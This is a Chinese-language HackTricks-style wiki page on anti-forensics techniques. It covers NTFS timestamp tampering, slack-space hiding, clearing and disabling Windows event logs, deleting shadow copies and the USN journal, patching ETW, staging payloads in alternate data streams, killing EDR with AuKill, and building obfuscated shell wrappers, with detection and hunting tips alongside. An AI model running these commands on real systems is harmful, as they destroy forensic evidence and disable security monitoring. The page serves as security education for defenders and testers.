# 反取证技术

{{#include ../../banners/hacktricks-training.md}}

## 时间戳

攻击者可能会想要**更改文件的时间戳**，以避免被发现。\
可以在 MFT 的 `$STANDARD_INFORMATION` \_\_ 和 \_\_ `$FILE_NAME` 属性中找到时间戳。

这两个属性都有 4 个时间戳：**修改时间**、**访问时间**、**创建时间**和 **MFT 记录修改时间**（MACE 或 MACB）。

**Windows 资源管理器**和其他工具会显示 **`$STANDARD_INFORMATION`** 中的信息。

### TimeStomp - 反取证工具

此工具会**修改** **`$STANDARD_INFORMATION`** 中的时间戳信息，**但不会**修改 **`$FILE_NAME`** 中的信息。因此，可以**识别**可疑活动。

### Usnjrnl

**USN 日志**（更新序列号日志）是 NTFS（Windows NT 文件系统）的一个功能，用于跟踪卷上的更改。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) 工具可用于检查这些更改。

![TimeStomp - 反取证工具 - Usnjrnl：USN 日志（更新序列号日志）是 NTFS（Windows NT 文件系统）的一个功能，用于跟踪卷上的更改。...](<../../images/image (801).png>)

上图是该**工具**显示的**输出**，可以看到文件发生了**一些更改**。

### $LogFile

文件系统中的**所有元数据更改都会通过一种称为**[预写日志](https://en.wikipedia.org/wiki/Write-ahead_logging)**的流程记录下来**。记录的元数据保存在 NTFS 文件系统根目录下的 `**$LogFile**` 文件中。可以使用 [LogFileParser](https://github.com/jschicht/LogFileParser) 等工具解析此文件并识别更改。

![Usnjrnl - $LogFile：文件系统中的所有元数据更改都会通过一种称为预写日志的流程记录下来。记录的元数据保存在 NTFS 文件系统根目录下名为 $LogFile 的文件中。...](<../../images/image (137).png>)

同样，从工具的输出中可以看到**发生了一些更改**。

使用同一个工具，可以识别时间戳被修改成了**什么时间**：

![Usnjrnl - $LogFile：使用同一个工具，可以识别时间戳被修改成了什么时间](<../../images/image (1089).png>)

- CTIME：文件创建时间
- ATIME：文件修改时间
- MTIME：文件的 MFT 记录修改时间
- RTIME：文件访问时间

### `$STANDARD_INFORMATION` 和 `$FILE_NAME` 对比

识别可疑文件的另一种方法是比较这两个属性中的时间，查找**不匹配**的情况。

### 纳秒

**NTFS** 时间戳的**精度**为 **100 纳秒**。因此，发现时间戳为 2010-10-10 10:10:**00.000:0000 的文件非常可疑**。

### SetMace - 反取证工具

此工具可以修改 `$STARNDAR_INFORMATION` 和 `$FILE_NAME` 两个属性。不过，从 Windows Vista 开始，必须在运行中的 OS 中修改这些信息。

## 数据隐藏

NFTS 使用簇和最小信息大小。这意味着，如果一个文件占用了一个半簇，那么**剩下的半个簇将不会被使用**，直到该文件被删除。因此，可以**在这个 slack space 中隐藏数据**。

slacker 等工具可以在这个“隐藏”空间中隐藏数据。不过，分析 `$logfile` 和 `$usnjrnl` 可以发现有数据被添加：

![SetMace - 反取证工具 - 数据隐藏：slacker 等工具可以在这个“隐藏”空间中隐藏数据。不过，分析 $logfile 和 $usnjrnl 可以发现有数据被添加。...](<../../images/image (1060).png>)

之后，可以使用 FTK Imager 等工具提取 slack space。请注意，此类工具可以将内容保存为混淆甚至加密的形式。

## UsbKill

这是一个工具，一旦检测到 USB 端口发生任何变化，就会**关闭计算机**。\
发现它的一种方法是检查正在运行的进程，并**逐一检查正在运行的 Python 脚本**。

## Live Linux 发行版

这些发行版会**在 RAM 内存中运行**。只有在 NTFS 文件系统以写入权限挂载时，才有办法检测到它们。如果仅以读取权限挂载，则无法检测到入侵。

## 安全删除

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### 延迟 Windows 自删除

正在运行的 Windows 映像可能会在其进程活动期间被锁定。进程可以将删除操作交给子进程 `cmd.exe`，使用 `choice` 计时，并在 shell 执行 `del` 之前退出。延迟可以让原始进程释放其映像句柄；如果路径包含空格，就必须将完整路径括起来。<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

当此字符串直接作为参数传给 `cmd.exe`（而不是在另一个交互式 `cmd` 提示符中输入）时，使用 `&` 而非 `^&`，并使用 `>nul` 而非 `^>nul`。这会移除目录项；但**不是安全擦除**，也不会清除执行记录、任务记录、文件系统日志或其他取证痕迹。查找命令行中同时包含 `choice /T`、`Del` 和父进程映像路径的短暂 `cmd.exe` 子进程。<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows 配置

可以禁用多种 Windows 日志记录方式，让取证调查变得困难得多。

### 禁用时间戳 - UserAssist

这是一个注册表项，用于记录用户运行每个可执行文件的日期和时间。

禁用 UserAssist 需要两步：

1. 将两个注册表项 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` 和 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` 都设为零，以表示我们要禁用 UserAssist。
2. 清除那些类似 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` 的注册表子树。

### 禁用时间戳 - Prefetch

此功能会保存已执行应用程序的信息，以提升 Windows 系统的性能。不过，这些信息也可能对取证有用。

- 执行 `regedit`
- 选择文件路径 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- 右键单击 `EnablePrefetcher` 和 `EnableSuperfetch`
- 分别选择“修改”，将值从 1（或 3）改为 0
- 重启

### 禁用时间戳 - 最后访问时间

每当从 Windows NT 服务器上的 NTFS 卷打开文件夹时，系统都会**更新每个所列文件夹的时间戳字段**，该字段称为最后访问时间。在繁忙的 NTFS 卷上，这可能会影响性能。

1. 打开注册表编辑器（Regedit.exe）。
2. 浏览到 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`。
3. 查找 `NtfsDisableLastAccessUpdate`。如果不存在，则添加此 DWORD 并将其值设为 1，以禁用此过程。
4. 关闭注册表编辑器并重启服务器。

### 删除 USB 历史记录

所有**USB 设备条目**都存储在 Windows 注册表的 **USBSTOR** 注册表项下，其中的子项会在你将 USB 设备插入 PC 或笔记本电脑时创建。你可以在此处找到该项：H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除此项**即可删除 USB 历史记录。\
你也可以使用工具 [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) 确认已将其删除（并删除它们）。

另一个保存 USB 信息的文件是 `C:\Windows\INF` 中的 `setupapi.dev.log`。此文件也应删除。

### 禁用卷影副本

使用 `vssadmin list shadowstorage` **列出**卷影副本\
运行 `vssadmin delete shadow` **删除**卷影副本

你也可以按照 [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) 中介绍的步骤通过 GUI 删除它们。

要禁用卷影副本，请参考[此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：

1. 点击 Windows 开始按钮后，在文本搜索框中输入“services”，打开“服务”程序。
2. 在列表中找到“Volume Shadow Copy”，选中它，然后右键单击并打开“属性”。
3. 在“启动类型”下拉菜单中选择“禁用”，然后点击“应用”和“确定”确认更改。

也可以在注册表 `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` 中修改卷影副本要复制的文件配置。

### 覆盖已删除的文件

- 你可以使用 **Windows 工具**：`cipher /w:C`。这会指示 cipher 清除 C 盘可用的未使用磁盘空间中的所有数据。
- 你也可以使用 [**Eraser**](https://eraser.heidi.ie) 等工具。

### 删除 Windows 事件日志

- Windows + R --> eventvwr.msc --> 展开“Windows 日志” --> 右键单击每个类别并选择“清除日志”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### 禁用 Windows 事件日志

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- 在“服务”部分禁用“Windows Event Log”服务
- `WEvtUtil.exec clear-log` 或 `WEvtUtil.exe cl`

### 禁用 $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## 高级日志记录与痕迹篡改（2023-2025）

### PowerShell ScriptBlock/Module 日志记录

较新的 Windows 10/11 和 Windows Server 版本会在
`Microsoft-Windows-PowerShell/Operational` 下保留**丰富的 PowerShell 取证痕迹**（事件 4104/4105/4106）。  
攻击者可以实时禁用或清除这些记录：

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

防御人员应监控这些注册表项的更改，以及大量删除 PowerShell 事件的行为。

### ETW (Event Tracing for Windows) 补丁

端点安全产品严重依赖 ETW。2024 年一种流行的规避方法是在内存中修补 `ntdll!EtwEventWrite`/`EtwEventWriteFull`，使每次 ETW 调用都返回 `STATUS_SUCCESS`，而不生成事件：<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

公开的 PoC（例如 `EtwTiSwallow`）会用 PowerShell 或 C++ 实现相同的原语。  
由于该补丁是**进程本地的**，在其他进程中运行的 EDR 可能检测不到它。<sup>[[5]](#references)</sup>
检测：比较内存中的 `ntdll` 与磁盘上的版本，或在 user-mode 之前安装 hook。

### Alternate Data Streams (ADS) 的复兴

2023 年的恶意软件活动（例如 **FIN12** 加载器）中，曾发现它们将第二阶段二进制文件暂存在 ADS 中，以躲避传统扫描器：

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

使用 `dir /R`、`Get-Item -Stream *` 或 Sysinternals `streams64.exe` 枚举数据流。
将宿主文件复制到 FAT/exFAT，或通过 SMB 复制，会剥离隐藏数据流，调查人员可利用这一点恢复载荷。

### BYOVD & “AuKill”（2023）

在勒索软件入侵中，Bring-Your-Own-Vulnerable-Driver 现已成为常用的**反取证**手段。  
开源工具 **AuKill** 会加载一个已签名但存在漏洞的驱动程序（`procexp152.sys`），在加密和日志销毁**之前**挂起或终止 EDR 和取证传感器：<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

之后会移除驱动，仅留下极少的痕迹。<sup>[[1]](#references)</sup>  
缓解措施：启用 Microsoft vulnerable-driver blocklist（HVCI/SAC），
并对从用户可写路径创建内核服务发出告警。

---

## Linux 反取证：自我修补与 Cloud C2（2023–2025）

### 自我修补已遭入侵的服务以降低被检测的风险（Linux）
攻击者越来越常在利用服务后立即对其进行“自我修补”，以防止再次被利用并抑制基于漏洞的检测。其思路是用最新的上游合法二进制文件/JAR 替换存在漏洞的组件，让扫描器报告主机已修补，同时保留持久化和 C2。<sup>[[3]](#references)</sup>

示例：Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）。<sup>[[3]](#references)[[4]](#references)</sup>
- Post‑exploitation 阶段，攻击者从 Maven Central（repo1.maven.org）获取合法 JAR，删除 ActiveMQ 安装目录中存在漏洞的 JAR，然后重启 broker。
- 这修复了最初的 RCE，同时保留了其他立足点（cron、SSH 配置更改、独立的 C2 implants）。

操作示例（仅作说明）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

取证/狩猎提示
- 检查服务目录，查找未经计划的二进制文件/JAR 替换：
  - Debian/Ubuntu：运行 `dpkg -V activemq`，并将文件哈希/路径与仓库镜像比较。
  - RHEL/CentOS：运行 `rpm -Va 'activemq*'`
  - 查找磁盘上存在但不归软件包管理器所有的 JAR 版本，或在非正常维护时段更新的符号链接。
- 时间线：运行 `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`，将 ctime/mtime 与失陷时间窗口关联起来。
- Shell 历史记录/进程遥测：初始利用后紧接着出现访问 `repo1.maven.org` 或其他制品 CDN 的 `curl`/`wget` 证据。
- 变更管理：核实是谁应用了这个“补丁”以及原因，而不只是确认存在已打补丁的版本。

### 使用 Bearer token 的云服务 C2 与反分析 stager
观察到的 TTP 将多种长连接 C2 路径与反分析封装结合使用：<sup>[[3]](#references)</sup>
- 受密码保护的 PyInstaller ELF 加载器，用于阻碍沙箱分析和静态分析（例如加密的 PYZ、在 `/_MEI*` 下临时解压）。
  - 指标：`strings` 命中 `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS` 等字符串。
  - 运行时痕迹：解压到 `/tmp/_MEI*` 或自定义的 `--runtime-tmpdir` 路径。
- 使用硬编码 OAuth Bearer token 的 Dropbox C2
  - 网络标记：带有 `Authorization: Bearer <token>` 的 `api.dropboxapi.com` / `content.dropboxapi.com` 请求。
  - 在代理/NetFlow/Zeek/Suricata 数据中搜寻来自通常不会同步文件的服务器工作负载、发往 Dropbox 域名的出站 HTTPS 流量。
- 通过隧道建立并行/备用 C2（例如 Cloudflare Tunnel `cloudflared`），以便在一个通道被阻断时仍能保持控制。
  - 主机 IOC：`cloudflared` 进程/单元、`~/.cloudflared/*.json` 中的配置，以及发往 Cloudflare 边缘节点的出站 443 流量。

### 通过“安全加固回滚”维持访问权限（Linux 示例）
攻击者经常将自我打补丁与持久访问路径结合使用：<sup>[[3]](#references)</sup>
- Cron/Anacron：修改每个 `/etc/cron.*/` 目录中的 `0anacron` 存根，以便定期执行。
  - 搜寻：
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- SSH 配置加固回滚：启用 root 登录，并更改低权限账户的默认 shell。
  - 搜索 root 登录启用情况：
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - 检查系统账户（例如 `games`）上是否存在可疑的交互式 shell：
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- 随机生成的短名称 beacon artifacts（8 个字母字符）被写入磁盘，且会联系 cloud C2：
  - 排查：
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

防御人员应将这些痕迹与外部暴露情况及服务补丁事件关联起来，以发现用于掩盖初始入侵的反取证式自我修复行为。

## 静态嵌入式 shell 执行

带有嵌入式解释器和命令实现的脚本包装器，可以在单个可执行文件中运行受支持的 shell 操作，而无需启动 `/bin/sh` 和单独的实用程序进程。HimitsuShell 会构建此类静态 musl 二进制文件。与 [SHc wrappers](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md) 不同，其内置命令无需启动主机 shell 或单独的实用程序进程。不支持的命令可以回退到系统 shell。<sup>[[9]](#references)</sup>

这会减少 shell 进程和子 `execve` 的可见性。<sup>[[9]](#references)</sup> 包装器进程及其系统调用仍可通过内核跟踪点观察到，因此不应将项目声称的“即使内核跟踪也无法发现”按字面理解。<sup>[[9]](#references)[[11]](#references)</sup>

对于文档中所述的 x86_64 构建，请将输入文件命名为 `launcher.sh`，并在编译前将其复制到容器中。输出文件为 `safeLauncher`：<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

公开的 `compile.sh` 使用 AES-256-CTR 加密脚本，使用 AES-256-CBC 加密过期值和中间密钥/IV，通过 `xxd -i` 将加密后的文件转换为 C 数组，并使用 `-static -s` 将它们与 `lib.bc` 链接。最终加密密钥和 IV 也嵌入其中，因此这只能抵御随手进行的静态提取，并不能让秘密永远无法恢复。<sup>[[10]](#references)</sup>

默认的 LLVM passes 是 `-sobf` 和 `-sub`。构建前编辑 `/var/work/compile.sh`，启用文档中列出的替代选项，例如 control-flow flattening（`fla`）或 bogus control flow（`bcf`）。<sup>[[9]](#references)[[10]](#references)</sup>

依赖此 wrapper 前，请先测试脚本兼容性：该项目以 POSIX shell 语法为目标，并警告 Bash/Zsh 脚本可能无法运行；它还说明，内置命令集之外的命令会调用系统 shell。<sup>[[9]](#references)</sup>

有关扁平化控制流的分析，请参阅 [bypassing flattened control flow with a narrow execution slice](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice)。

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill：用于禁用 EDR 的武器化易受攻击驱动程序（2023 年 3 月）](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – 通过修补 EtwEventWrite 实现隐蔽：检测与狩猎（2024 年 6 月）](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – 修补以实现持久化：DripDropper Linux 恶意软件如何在云端移动](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE（NVD）](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [隐藏你的 .NET - ETW（Adam Chester / XPN）](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – 揭露嵌入合法软件中的 SectopRAT 变种](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [HimitsuShell README](https://github.com/HimitsuShell/HimitsuShell)
- [10] [HimitsuShell 构建脚本](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Linux 内核事件直方图与系统调用跟踪](https://docs.kernel.org/trace/histogram.html)
